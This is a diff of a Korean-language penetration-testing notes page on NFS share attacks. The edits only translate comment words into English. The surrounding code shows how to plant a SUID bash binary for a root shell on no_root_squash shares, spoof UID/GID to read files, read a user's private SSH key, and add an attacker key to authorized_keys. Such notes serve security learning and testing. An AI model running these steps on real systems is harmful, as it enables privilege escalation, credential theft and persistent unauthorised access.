@@ -54,14 +54,14 @@ umount /tmp/nfs
 # no_root_squash인 경우: SUID 바이너리 배치
 cp /bin/bash /tmp/nfs/bash
 chmod +s /tmp/nfs/bash
-# 타겟에서: /share/bash -p → root 쉘
+# target에서: /share/bash -p → root 쉘
 ```
 
 ### UID/GID 스푸핑
 
 ```bash
 # NFS에서 파일 접근 권한은 UID/GID 기반
-# 타겟 파일의 소유자 UID를 확인하고 로컬에서 동일한 UID로 사용자 생성
+# target 파일의 소유자 UID를 확인하고 로컬에서 동일한 UID로 사용자 생성
 
 # 파일 소유자 확인
 ls -ln /tmp/nfs/
@@ -75,7 +75,7 @@ cat /tmp/nfs/sensitive_file
 ### SSH 키 탈취/배치
 
 ```bash
-# .ssh 디렉토리 접근 가능 시
+# .ssh directory 접근 가능 시
 cat /tmp/nfs/home/user/.ssh/id_rsa
 
 # authorized_keys에 공격자 키 추가
